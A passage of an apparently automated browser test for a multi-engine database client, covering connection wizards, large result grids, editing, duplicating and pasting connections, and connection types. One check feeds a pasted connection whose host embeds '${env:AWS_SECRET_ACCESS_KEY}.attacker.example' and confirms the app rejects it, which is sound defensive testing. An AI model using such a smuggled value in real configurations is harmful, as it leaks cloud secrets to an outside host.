  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();

  // A new SQLite database: the core creates the file and never overwrites it.
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard");
  await wizard.locator(".engine-card", { hasText: "SQLite" }).click();
  const newDb = join(userDir, "scratch.sqlite");
  await page.evaluate((target) => (window.__spelaionSavePath = target), newDb);
  await wizard.getByRole("button", { name: "New database…" }).click();
  const fileInput = wizard.getByLabel("File", { exact: true });
  for (let i = 0; i < 40 && (await fileInput.inputValue()) !== newDb; i++) await page.waitForTimeout(100);
  assert.equal(await fileInput.inputValue(), newDb);
  assert.equal(await wizard.getByLabel("Name", { exact: true }).inputValue(), "scratch");
  assert.ok(readFileSync(newDb).subarray(0, 16).equals(Buffer.from("SQLite format 3\0")));
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 3\./ }).waitFor();
  await wizard.getByRole("button", { name: "New database…" }).click();
  await wizard.getByRole("alert").filter({ hasText: "already exists: a new database never replaces a file" }).waitFor();
  await shot("12a2-new-sqlite-database");
  // Tags already used by other connections are suggested.
  await wizard.getByRole("tab", { name: "Options" }).click();
  const suggested = await wizard.locator(".tag-input datalist option").evaluateAll((options) => options.map((o) => o.value));
  assert.deepEqual(suggested, ["demo", "Testing"]);
  await page.evaluate(() => delete window.__spelaionSavePath);
  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
  await wizard.waitFor({ state: "detached" });

  step("DuckDB: a new database file, nested types as DuckDB writes them, two tabs on one file");
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard");
  await wizard.locator(".engine-card", { hasText: "DuckDB" }).click();
  const duckDb = join(userDir, "analytics.duckdb");
  await page.evaluate((target) => (window.__spelaionSavePath = target), duckDb);
  await wizard.getByRole("button", { name: "New database…" }).click();
  const duckFile = wizard.getByLabel("File", { exact: true });
  for (let i = 0; i < 40 && (await duckFile.inputValue()) !== duckDb; i++) await page.waitForTimeout(100);
  assert.equal(await duckFile.inputValue(), duckDb);
  assert.equal(await wizard.getByLabel("Name", { exact: true }).inputValue(), "analytics");
  await page.evaluate(() => delete window.__spelaionSavePath);
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · v\d+\./ }).waitFor();
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "analytics" }).waitFor();
  assert.match(readFileSync(join(userDir, "connections", "analytics.toml"), "utf8"), /engine = "duckdb"/);
  panel = await newQuery(
    "analytics",
    "create table sales as select range as id, [range, range * 2] as pair, {'city': 'Madrid'} as place from range(3);\nselect * from sales order by id;",
  );
  await run(panel);
  await panel.locator(".statusline", { hasText: "3 rows" }).waitFor();
  await shot("12a3-duckdb");
  step("grid look: booleans as checkboxes and NULL drawn empty, from Settings");
  {
    const looks = await newQuery("analytics", "select true as yes, false as no, cast(null as varchar) as nothing;");
    await run(looks);
    await looks.locator(".statusline", { hasText: "1 row" }).waitFor();
    const [yesW, noW] = (await looks.locator(".grid-scroller").getAttribute("data-column-widths")).split(",").map(Number);
    const ROW_NUM = 52;
    const middle = 36 + 13;
    const yesCentre = ROW_NUM + yesW / 2;
    const nothingX = ROW_NUM + yesW + noW;
    const nullInk = () => inked(looks, nothingX + 4, middle - 6, nothingX + 40, middle + 6);
    // Text by default: "true" starts on the left, the middle of the cell is empty.
    const bg = await pixel(looks, yesCentre + 30, middle);
    assert.equal(await pixel(looks, yesCentre - 3, middle + 3), bg);
    assert.ok((await nullInk()) > 0, "NULL is written");
    await setGridLook({ boolCheckboxes: true, nullText: false });
    assert.notEqual(await pixel(looks, yesCentre - 3, middle + 3), bg, "a ticked checkbox in the middle of true");
    assert.equal(await nullInk(), 0, "NULL drawn empty");
    await shot("12a4-grid-checkboxes");
    await setGridLook({ boolCheckboxes: false, nullText: true });
    await page.keyboard.press("Control+w");
  }

  step("a million rows: select, find, sort, filter by value and copy a column, the UI painting all along");
  {
    const big = await newQuery(
      "analytics",
      "select range as id, 'item ' || range as name, range * 1.5 as price, range % 7 = 0 as lucky from range(1000000) limit 1000000;",
    );
    const timings = {};
    let measured = await longestFrameGap(async () => {
      await run(big);
      await big.locator(".statusline", { hasText: "1,000,000 rows" }).waitFor({ timeout: 120_000 });
    });
    timings.load = measured;
    const grid = big.locator(".grid-scroller");
    const box = await grid.boundingBox();
    const rowNum = 9 * 8 + 16; // "1,000,000" in the row-number gutter
    const widths = async () => (await grid.getAttribute("data-column-widths")).split(",").map(Number);
    const status = big.locator(".grid-selection");
    // Scrolling to the middle and the end.
    timings.scroll = await longestFrameGap(async () => {
      for (const at of [0.5, 1]) {
        await grid.evaluate((el, f) => (el.scrollTop = (el.scrollHeight - el.clientHeight) * f), at);
        await page.waitForTimeout(300);
      }
      await grid.evaluate((el) => (el.scrollTop = 0));
      await page.waitForTimeout(200);
    });
    await page.mouse.click(box.x + rowNum + 20, box.y + 36 + 13);
    timings.selectAll = await longestFrameGap(async () => {
      await page.keyboard.press("Control+a");
      await status.getByText("All 1,000,000 rows selected", { exact: true }).waitFor();
      await page.keyboard.press("Control+End");
      await status.getByText("1 cell selected", { exact: true }).waitFor();
      await page.keyboard.press("Control+Shift+Home");
      await status.getByText("All 1,000,000 rows selected", { exact: true }).waitFor();
    });
    await page.mouse.click(box.x + rowNum + 20, box.y + 36 + 13);
    // Find: the core reads every cell of the million rows.
    await page.keyboard.press("Control+f");
    const bar = big.getByRole("search", { name: "Find in results" });
    timings.find = await longestFrameGap(async () => {
      await bar.getByRole("searchbox").fill("item 99999");
      // Only names hold "item": 99999 and 999990–999999.
      await bar.getByRole("status").getByText("1 of 11", { exact: true }).waitFor({ timeout: 60_000 });
    });
    await bar.getByRole("searchbox").focus();
    await page.keyboard.press("Escape");
    await grid.evaluate((el) => (el.scrollTop = 0));
    // Sort in the core by a header click, then back.
    const [idW, nameW] = await widths();
    timings.sort = await longestFrameGap(async () => {
      await page.mouse.click(box.x + rowNum + idW + nameW + 20, box.y + 18);
      await big.locator('.grid-scroller[aria-label="Result with 1,000,000 rows, sorted by price, ascending"]').waitFor({ timeout: 60_000 });
      await page.mouse.click(box.x + rowNum + idW + nameW + 20, box.y + 18);
      await big.locator('.grid-scroller[aria-label="Result with 1,000,000 rows, sorted by price, descending"]').waitFor({ timeout: 60_000 });
      await page.mouse.click(box.x + rowNum + idW + nameW + 20, box.y + 18);
      await big.locator('.grid-scroller[aria-label="Result with 1,000,000 rows"]').waitFor({ timeout: 60_000 });
    });
    // Filter by this value: name contains "item 12345" (12345 and 123450–123459).
    timings.filter = await longestFrameGap(async () => {
      await grid.evaluate((el) => (el.scrollTop = 26 * 12_345));
      await page.waitForTimeout(300);
      // The row at the top is 12345 (rows are 26 px high).
      await page.mouse.click(box.x + rowNum + idW + 20, box.y + 36 + 13, { button: "right" });
      await big.locator(".result-grid-menu").getByRole("menuitem", { name: "Filter ▸" }).hover();
      await big.getByRole("menuitem", { name: "name contains 'item 12345'" }).click();
      await big.locator(".statusline", { hasText: "11 of 1,000,000 rows" }).waitFor({ timeout: 60_000 });
    });
    await big.getByRole("button", { name: "Reset filters" }).click();
    await big.locator(".statusline", { hasText: /^1,000,000 rows/ }).waitFor({ timeout: 60_000 });
    // Every value of a column as an IN list: two for "lucky", too many for "id".
    const luckyX = box.x + rowNum + (await widths()).slice(0, 3).reduce((a, b) => a + b, 0) + 20;
    timings.inList = await longestFrameGap(async () => {
      const before = await page.evaluate(() => window.__copied.length);
      await page.mouse.click(luckyX, box.y + 18, { button: "right" });
      await big.locator(".result-grid-menu").getByRole("menuitem", { name: "Copy all values as SQL IN list" }).click();
      assert.equal(await copied(before + 1), "(TRUE, FALSE)");
    });
    await page.mouse.click(box.x + rowNum + 20, box.y + 18, { button: "right" });
    await big.locator(".result-grid-menu").getByRole("menuitem", { name: "Copy all values as SQL IN list" }).click();
    await big.locator(".grid-notice.error", { hasText: "more than 10000 different values" }).waitFor();
    await shot("12a5-grid-million");
    const report = Object.entries(timings).map(([name, t]) => `${name} ${t.elapsed} ms (longest frame gap ${t.gap} ms)`).join(", ");
    console.log(`  1M rows: ${report}`);
    writeFileSync(join(shots, "million-rows.json"), JSON.stringify(timings, null, 2));
    for (const [name, t] of Object.entries(timings)) {
      // The query itself streams a million rows in: only the rest must keep painting.
      if (name !== "load") assert.ok(t.gap < 1000, `${name}: the UI froze for ${t.gap} ms`);
    }
    await page.keyboard.press("Control+w");
  }
  // A second tab on the same file (DuckDB opens a file once per process: they share it).
  const second = await newQuery("analytics", "select count(*) as n from sales;");
  await run(second);
  await second.locator(".statusline", { hasText: "1 row" }).waitFor();

  step("SQL Server: a new connection, a batch with two result sets");
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard");
  await wizard.locator(".engine-card", { hasText: "SQL Server" }).click();
  await wizard.getByLabel("Name", { exact: true }).fill("SQL Server (Docker)");
  await wizard.getByLabel("Host", { exact: true }).fill("127.0.0.1");
  await wizard.getByLabel("Port", { exact: true }).fill("11433");
  await wizard.getByLabel("User", { exact: true }).fill("sa");
  // Asked every time: never stored, not even in the keychain.
  await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
  await wizard.getByLabel("Password", { exact: true }).fill("Spelaion-test-1");
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 16\./ }).waitFor();
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  assert.match(readFileSync(join(userDir, "connections", "sql-server-docker.toml"), "utf8"), /engine = "sqlserver"/);
  panel = await newQuery("SQL Server (Docker)", "select name from sys.databases where name = 'master'\nselect 1 as a, N'ñandú' as b");
  await run(panel);
  await page.getByRole("dialog").getByText("Password for SQL Server (Docker)").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("Spelaion-test-1");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  // One batch, two result sets: two result tabs.
  await panel.locator(".result-tabs button", { hasText: /^Result 2/ }).waitFor();
  // The tab's database, from sys.databases; switching runs the next statements there.
  const sqlServerDatabase = panel.getByLabel("Database", { exact: true });
  await sqlServerDatabase.locator('option[value="tempdb"]').waitFor({ state: "attached" });
  await page.waitForFunction((el) => !el.disabled && el.value === "master", await sqlServerDatabase.elementHandle());
  await sqlServerDatabase.selectOption("tempdb");
  await page.waitForFunction((el) => !el.disabled && el.value === "tempdb", await sqlServerDatabase.elementHandle());
  // PRINT and low-severity RAISERROR reach the Messages tab (ADR-035).
  await replaceQuery(panel, "print 'hello from the smoke test'\nraiserror('a low severity message', 10, 1)");
  await run(panel);
  await panel.getByText("INFO: hello from the smoke test").waitFor();
  await panel.getByText("INFO: a low severity message").waitFor();
  await shot("12a4-sqlserver");
  step("process monitor: SQL Server sessions and supported actions");
  await activities.getByRole("button", { name: "Processes", exact: true }).click();
  await page.locator("#processes-sidebar").getByRole("button", { name: "SQL Server (Docker)", exact: true }).click();
  const sqlServerMonitor = page.getByRole("region", { name: "Processes", exact: true });
  await sqlServerMonitor.locator(".process-table tbody tr:has(.process-own)").waitFor();
  await sqlServerMonitor.locator(".process-table tbody tr:not(:has(.process-own))").first().click();
  assert.ok(await sqlServerMonitor.getByRole("button", { name: "Cancel query" }).isDisabled());
  assert.equal(await sqlServerMonitor.getByRole("button", { name: "Cancel query" }).getAttribute("title"), "SQL Server can only end another session, not cancel its query separately.");
  assert.ok(await sqlServerMonitor.getByRole("button", { name: "End connection" }).isEnabled());
  await activities.getByRole("button", { name: "Connections", exact: true }).click();
  // The query ends in a word, which may open the completion list as it is typed: the next
  // dialog must not find it on top (the editor closes it when it loses focus).

  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard");
  await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
  assert.deepEqual(await wizard.getByRole("tab").allTextContents(), ["Main", "SSL", "SSH", "Kubernetes", "Options"]);
  await wizard.getByLabel("Name", { exact: true }).fill("Docker PG (wizard)");
  await wizard.getByLabel("Host", { exact: true }).fill("127.0.0.1");
  await wizard.getByLabel("Port", { exact: true }).fill("15432");
  await wizard.getByLabel("Database", { exact: true }).fill("spelaion");
  await wizard.getByLabel("User", { exact: true }).fill("spelaion");
  // Passwordless logins (ADR-022): a cloud provider's token here, a client certificate in SSL.
  const authMethod = wizard.getByLabel("Method", { exact: true });
  await authMethod.selectOption("token");
  await wizard.getByLabel("Provider", { exact: true }).selectOption("googleCloudSql");
  await wizard.getByText("gcloud sql generate-login-token", { exact: false }).waitFor();
  assert.equal(await wizard.getByLabel("Password", { exact: true }).count(), 0);
  await authMethod.selectOption("password");
  // Not saving the password means "ask every time": the typed one is only used for the test
  // and never stored (not even in the keychain).
  await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
  await wizard.getByRole("button", { name: "Test connection" }).click();
  // The test log (ADR-032): the address is reached, the login needs the password.
  await wizard.locator(".test-result", { hasText: "Failed at step 3: Password required" }).waitFor();
  await wizard.locator(".test-log .step.ok", { hasText: "Reach 127.0.0.1:15432" }).waitFor();
  await wizard.locator(".test-log .step.failed", { hasText: "type it in the form" }).waitFor();
  await wizard.getByLabel("Password", { exact: true }).fill("wrong");
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: "Database authentication" }).waitFor();
  await wizard.locator(".test-log .step.failed", { hasText: "password authentication failed" }).waitFor();
  await wizard.getByLabel("Password", { exact: true }).fill("spelaion");
  await shot("12b-add-connection-main");
  await wizard.getByRole("tab", { name: "SSL" }).click();
  await wizard.getByLabel("TLS", { exact: true }).selectOption("require");
  await wizard.getByLabel("Client certificate (PEM)", { exact: true }).waitFor();
  await wizard.getByLabel("Client key (PEM)", { exact: true }).waitFor();
  await wizard.getByRole("tab", { name: "SSH" }).click();
  // The demo defines one tunnel; leaving the box unchecked connects directly.
  assert.equal(await wizard.getByRole("checkbox", { name: "Connect through a network profile (SSH tunnel or proxy)" }).isChecked(), false);
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByLabel("Folder", { exact: true }).fill("Wizard");
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  // Agents only read unless the user lets them write, and only on an exposed connection.
  const agentsCan = wizard.getByLabel("Agents can", { exact: true });
  assert.equal(await agentsCan.isDisabled(), true);
  await wizard.getByRole("checkbox", { name: "Expose to AI agents" }).check();
  await agentsCan.selectOption("write");
  // The warning follows what the core says the type does, not the label's text.
  await wizard.getByLabel("Connection type", { exact: true }).selectOption("prod");
  await wizard.getByRole("alert").filter({ hasText: "agents will be able to change its data" }).waitFor();
  await wizard.getByLabel("Connection type", { exact: true }).selectOption("");
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 17\./ }).waitFor();
  await shot("12c-add-connection-options");
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "Docker PG (wizard)" }).waitFor();
  const saved = readFileSync(join(userDir, "connections", "wizard", "docker-pg-wizard.toml"), "utf8");
  assert.match(saved, /secret = "prompt"/);
  assert.match(saved, /mode = "require"/);
  // New connections keep idle sessions alive (ADR-028).
  assert.match(saved, /keepalive = 300/);
  assert.match(saved, /\[mcp\]\nexposed = true\nwrites = "allow"/);
  assert.doesNotMatch(saved, /wrong|password = "/);
  assert.ok(!existsSync(join(demo, ".spelaion", "connections", "shop-copy.toml")), "personal connections stay out of the repository");

  step("edit a connection: same file, comments of the form kept, location fixed");
  await (await connectionMenu("Docker PG (wizard)")).getByRole("button", { name: "Edit…" }).click();
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("heading", { name: "Edit Docker PG (wizard)" }).waitFor();
  assert.equal(await wizard.getByLabel("Host", { exact: true }).inputValue(), "127.0.0.1");
  assert.equal(await wizard.getByRole("checkbox", { name: "Save password" }).isChecked(), false);
  await wizard.getByLabel("Name", { exact: true }).fill("Docker PG (edited)");
  await wizard.getByRole("tab", { name: "SSL" }).click();
  assert.equal(await wizard.getByLabel("TLS", { exact: true }).inputValue(), "require");
  await wizard.getByLabel("TLS", { exact: true }).selectOption("prefer");
  await wizard.getByRole("tab", { name: "Options" }).click();
  assert.ok(await wizard.getByLabel("Folder", { exact: true }).isDisabled());
  assert.ok(await wizard.getByRole("radio", { name: "Project", exact: true }).isDisabled());
  await wizard.getByRole("tab", { name: "Main" }).click();
  await wizard.getByLabel("Password", { exact: true }).fill("spelaion");
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 17\./ }).waitFor();
  await shot("13a-edit-connection");
  await wizard.getByRole("button", { name: "Save changes" }).click();
  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "Docker PG (edited)" }).waitFor();
  const edited = readFileSync(join(userDir, "connections", "wizard", "docker-pg-wizard.toml"), "utf8");
  assert.match(edited, /name = "Docker PG \(edited\)"/);
  assert.doesNotMatch(edited, /\[tls\]|spelaion"\s*\n\s*password = "/);

  step("name pattern: Settings checks and previews it, the add-connection form fills the name from it");
  await withSettings("connections", async (settings) => {
    const patternBox = settings.getByLabel("Pattern", { exact: true });
    assert.equal(await patternBox.inputValue(), "{database|host}");
    await patternBox.fill("{engine} {hots} {schema}");
    await settings.getByRole("alert").filter({ hasText: "Unknown variables: {hots}, {schema}" }).waitFor();
    assert.ok(await settings.getByRole("button", { name: "Save", exact: true }).isDisabled());
    await patternBox.fill("{engine} - ");
    await settings.getByRole("button", { name: "{database}", exact: true }).click();
    assert.equal(await patternBox.inputValue(), "{engine} - {database}");
    await patternBox.fill("{engine} - {database|host}");
    const preview = settings.getByRole("definition");
    await preview.filter({ hasText: "PostgreSQL - orders" }).waitFor();
    await preview.filter({ hasText: "SQLite - shop" }).waitFor();
    await shot("13c-name-pattern");
    await settings.getByRole("button", { name: "Save", exact: true }).click();
    await settings.getByRole("status").filter({ hasText: "Saved." }).waitFor();
  });
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard");
  await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
  const nameBox = wizard.getByLabel("Name", { exact: true });
  const waitName = async (expected) => {
    for (let i = 0; i < 50 && (await nameBox.inputValue()) !== expected; i++) await page.waitForTimeout(100);
    assert.equal(await nameBox.inputValue(), expected);
  };
  // The host starts as localhost; no database yet: the pattern's second choice.
  await waitName("PostgreSQL - localhost");
  await wizard.getByLabel("Database", { exact: true }).fill("sales");
  await waitName("PostgreSQL - sales");
  // A name of one's own stops it; emptying the field gives the name back to the pattern.
  await nameBox.fill("Mine");
  await wizard.getByLabel("Database", { exact: true }).fill("reports");
  await page.waitForTimeout(300);
  assert.equal(await nameBox.inputValue(), "Mine");
  await nameBox.fill("");
  await waitName("PostgreSQL - reports");
  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  await withSettings("connections", async (settings) => {
    await settings.getByRole("button", { name: "Back to the default" }).click();
    await settings.getByRole("status").filter({ hasText: "Saved." }).waitFor();
    assert.equal(await settings.getByLabel("Pattern", { exact: true }).inputValue(), "{database|host}");
  });

  step("duplicate a repository connection: next to the original, every setting kept, opened to edit");
  const mysqlFile = join(demo, ".spelaion", "connections", "docker", "mysql.toml");
  const mysqlCopyFile = join(demo, ".spelaion", "connections", "docker", "mysql-copy.toml");
  await (await connectionMenu("MySQL (Docker)")).getByRole("button", { name: "Duplicate" }).click();
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("heading", { name: "Edit MySQL (Docker) (copy)" }).waitFor();
  await wizard.getByRole("status").filter({ hasText: "is a copy of “MySQL (Docker)”, already saved" }).waitFor();
  await shot("13d-duplicated-connection");
  assert.equal(
    readFileSync(mysqlCopyFile, "utf8"),
    readFileSync(mysqlFile, "utf8").replace('name = "MySQL (Docker)"', 'name = "MySQL (Docker) (copy)"'),
  );
  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "MySQL (Docker) (copy)" }).waitFor();

  step("change a connection's engine: MySQL → MariaDB, shown before saving, its sessions closed");
  panel = await newQuery("MySQL (Docker) (copy)", "select version() as v;");
  await run(panel);
  await page.getByRole("dialog").getByText("Password for MySQL (Docker) (copy)").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  assert.match(await panel.locator(".status-connected").innerText(), /8\.4\./);
  await (await connectionMenu("MySQL (Docker) (copy)")).getByRole("button", { name: "Edit…" }).click();
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("heading", { name: "Edit MySQL (Docker) (copy)" }).waitFor();
  assert.equal(await wizard.getByLabel("Engine", { exact: true }).inputValue(), "mysql");
  await wizard.getByLabel("Engine", { exact: true }).selectOption("mariadb");
  const summary = wizard.getByRole("status", { name: "Engine change" });
  await summary.getByText("Engine: MySQL → MariaDB. Nothing is saved until you save.").waitFor();
  await summary.getByText(/^Kept: host, port, database, user, password, TLS mode, connection type\.$/).waitFor();
  assert.equal(await summary.getByText(/^(Changed|Removed|To fill in):/).count(), 0);
  await shot("13e-engine-change");
  // The copy keeps MySQL's port; MariaDB is the next container.
  assert.equal(await wizard.getByLabel("Port", { exact: true }).inputValue(), "13306");
  await wizard.getByLabel("Port", { exact: true }).fill("13307");
  await wizard.getByLabel("Name", { exact: true }).fill("MariaDB (copy)");
  await wizard.getByRole("button", { name: "Save changes" }).click();
  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "MariaDB (copy)" }).waitFor();
  const changedCopy = readFileSync(mysqlCopyFile, "utf8");
  assert.match(changedCopy, /^engine = "mariadb"$/m);
  assert.match(changedCopy, /^port = 13307$/m);
  assert.match(changedCopy, /^# MySQL from testing\/docker/m, "the file's comments stay");
  assert.match(changedCopy, /\[tls\]\nmode = "require"/);
  // The tab was closed with its old session: it connects to the new engine when run.
  await panel.locator(".status-connected").waitFor({ state: "detached" });
  await run(panel);
  await page.getByRole("dialog").getByText("Password for MariaDB (copy)").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  assert.match(await panel.locator(".status-connected").innerText(), /MariaDB/);
  // Its own write: the repository copy was pinned, no review is asked.
  assert.equal(await page.getByRole("dialog", { name: "This changed since you trusted the repository" }).count(), 0);

  step("copy and paste a connection: no password on the clipboard, pasted as a personal connection");
  const copyRow = page.locator(".connection-row", { hasText: "MariaDB (copy)" });
  const copiedBefore = await page.evaluate(() => window.__copied.length);
  await copyRow.locator(".label").click();
  await page.keyboard.press("Control+c");
  const connectionText = await copied(copiedBefore + 1);
  assert.match(connectionText, /^engine = "mariadb"$/m);
  assert.match(connectionText, /secret = "prompt"/);
  assert.doesNotMatch(connectionText, /keychain|spelaion"\s*\n\s*password = "/);
  await page.locator(".row-note", { hasText: "“MariaDB (copy)” copied, without its password." }).waitFor();
  // Delete the repository copy (the clipboard keeps its text), then paste it back.
  await (await connectionMenu("MariaDB (copy)")).getByRole("button", { name: "Delete…" }).click();
  const deleteCopy = page.getByRole("dialog", { name: "Delete connection?" });
  await deleteCopy.getByRole("button", { name: "Delete", exact: true }).click();
  await deleteCopy.waitFor({ state: "detached" });
  await copyRow.waitFor({ state: "detached" });
  assert.ok(!existsSync(mysqlCopyFile));
  // Ctrl+V in the explorer: its paste event carries the text.
  await page.locator(".connection-row", { hasText: "Shop (SQLite)" }).locator(".label").click();
  await page.evaluate((text) => {
    const data = new DataTransfer();
    data.setData("text/plain", text);
    document.activeElement.dispatchEvent(new ClipboardEvent("paste", { clipboardData: data, bubbles: true, cancelable: true }));
  }, connectionText);
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("heading", { name: "Edit MariaDB (copy)" }).waitFor();
  await wizard.getByRole("status").filter({ hasText: "was pasted as a personal connection" }).waitFor();
  await shot("13f-pasted-connection");
  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  const pastedFile = join(userDir, "connections", "mariadb-copy.toml");
  const pastedText = readFileSync(pastedFile, "utf8");
  assert.match(pastedText, /engine = "mariadb"/);
  assert.match(pastedText, /secret = "prompt"/);
  assert.ok(!existsSync(mysqlCopyFile), "a paste never writes to the repository");
  // "Paste connection" from the menu reads the clipboard; untrusted text cannot read secrets.
  await page.evaluate(() => {
    navigator.clipboard.readText = () =>
      Promise.resolve('schema_version = 1\nengine = "mysql"\nhost = "${env:AWS_SECRET_ACCESS_KEY}.attacker.example"\nuser = "u"\n');
  });
  const pastedRow = page.locator(".connection-row", { hasText: "MariaDB (copy)" });
  await pastedRow.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Paste connection" }).click();
  await page.getByRole("alert").filter({ hasText: "a pasted connection cannot use ${env:AWS_SECRET_ACCESS_KEY}" }).waitFor();
  await page.evaluate((text) => (navigator.clipboard.readText = () => Promise.resolve(text)), connectionText);
  await pastedRow.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Paste connection" }).click();
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("heading", { name: "Edit MariaDB (copy) (copy)" }).waitFor();
  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  // The pasted connection connects like the original, asking for its password.
  panel = await newQuery("MariaDB (copy) (copy)", "select version() as v;");
  await run(panel);
  await page.getByRole("dialog").getByText("Password for MariaDB (copy) (copy)").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  assert.match(await panel.locator(".status-connected").innerText(), /MariaDB/);
  for (const name of ["MariaDB (copy) (copy)", "MariaDB (copy)"]) {
    await (await connectionMenu(name)).getByRole("button", { name: "Delete…" }).click();
    const confirmDelete = page.getByRole("dialog", { name: "Delete connection?" });
    await confirmDelete.getByRole("button", { name: "Delete", exact: true }).click();
    await confirmDelete.waitFor({ state: "detached" });
  }
  await page.locator(".connection-row", { hasText: "MariaDB (copy)" }).waitFor({ state: "detached" });

  step("connection types: made in Settings, picked in the form, a tinted badge in the sidebar and the editor, asking before any run");
  await withSettings("types", async (settings) => {
    await settings.getByRole("listitem", { name: "Production" }).waitFor();
    await settings.getByRole("button", { name: "New type…" }).click();
    const typeEditor = page.getByRole("dialog", { name: "New connection type" });
    await typeEditor.getByLabel("Id", { exact: true }).focus();
    await page.keyboard.press("Escape");
    await typeEditor.waitFor({ state: "detached" });
    assert.ok(await settings.getByRole("button", { name: "New type…" }).evaluate((button) => document.activeElement === button), "closing a nested dialog restores focus");
    await settings.getByRole("button", { name: "New type…" }).click();
    await typeEditor.getByLabel("Id", { exact: true }).fill("careful");
    await typeEditor.getByLabel("Name", { exact: true }).fill("Careful");
    await typeEditor.getByLabel("Badge tone", { exact: true }).selectOption("amber");
    await typeEditor.getByRole("checkbox", { name: "Ask before running any SQL" }).check();
    // Production's own safeguard is fixed: it cannot be switched off from here.
    await typeEditor.getByRole("button", { name: "Save" }).click();
    await typeEditor.waitFor({ state: "detached" });
    await settings.getByRole("listitem", { name: "Careful" }).waitFor();
    await settings.getByRole("listitem", { name: "Production" }).getByRole("button", { name: "Edit…" }).click();
    const prodEditor = page.getByRole("dialog", { name: "Connection type Production" });
    const confirmChanges = prodEditor.getByRole("checkbox", { name: "Ask before changing data" });
    assert.ok(await confirmChanges.isChecked());
    assert.ok(await confirmChanges.isDisabled());
    await shot("13b-connection-types");
    await prodEditor.getByRole("button", { name: "Cancel" }).click();
    await prodEditor.waitFor({ state: "detached" });
  });
  assert.match(readFileSync(join(userDir, "connection-types.toml"), "utf8"), /\[types\.careful\][^[]*confirm_execution = true/);
  await (await connectionMenu("Shop copy")).getByRole("button", { name: "Edit…" }).click();
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByLabel("Connection type", { exact: true }).selectOption("careful");
  await wizard.getByText("Asks before every run").waitFor();
  await wizard.getByRole("button", { name: "Save changes" }).click();
  await wizard.waitFor({ state: "detached" });
  assert.match(readFileSync(join(userDir, "connections", "shop-copy.toml"), "utf8"), /env = "careful"/);
  // The type comes from the core: a badge with its name and tone next to the connection…
  const carefulBadge = page.locator(".connection-row", { hasText: "Shop copy" }).locator('.type-badge[data-connection-type="careful"]');
  assert.equal(await carefulBadge.innerText(), "Careful");
  assert.ok(await carefulBadge.evaluate((el) => el.classList.contains("tone-amber")));
  assert.match(await page.locator(".connection-row", { hasText: "Shop copy" }).locator(".label").getAttribute("title"), /Type: Careful/);
  // Marks never squeeze a name and are never cut: a badge, SSH or tag mark is shown whole, and only
  // next to a name shown whole; the others are on a line that is never shown.
  const badRows = await page.evaluate(() =>
    [...document.querySelectorAll(".connection-row")].flatMap((row) => {
      const label = row.querySelector(".label");
      const marks = row.querySelector(".connection-marks");
      if (!label || !marks) return [];
      const box = marks.getBoundingClientRect();
      const visible = [...marks.children].filter((mark) => mark.getBoundingClientRect().top < box.bottom);
      const cut = visible.some((mark) => {
        const r = mark.getBoundingClientRect();
